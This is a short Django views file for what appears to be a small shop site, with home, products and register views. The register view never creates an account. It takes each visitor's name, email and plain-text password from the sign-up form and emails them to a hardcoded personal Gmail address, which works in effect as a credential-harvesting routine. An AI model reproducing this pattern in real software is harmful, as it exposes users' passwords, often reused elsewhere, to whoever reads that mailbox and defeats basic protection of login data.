from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

def home(request):
    return render(request, 'index.html')

def products(request):
    return render(request, 'products.html')

def register(request):
    if request.method == 'POST':
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        email = request.POST.get('email')
        password = request.POST.get('password')

        # Send Email
        subject = f'New Registration: {first_name} {last_name}'
        message = f'User Details:\nName: {first_name} {last_name}\nEmail: {email}\nPassword: {password}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = ['narimanrobo8@gmail.com']
        
        try:
            send_mail(subject, message, email_from, recipient_list)
        except Exception as e:
            print(f"Email failed to send: {e}")

        return redirect('products')
    return redirect('home')
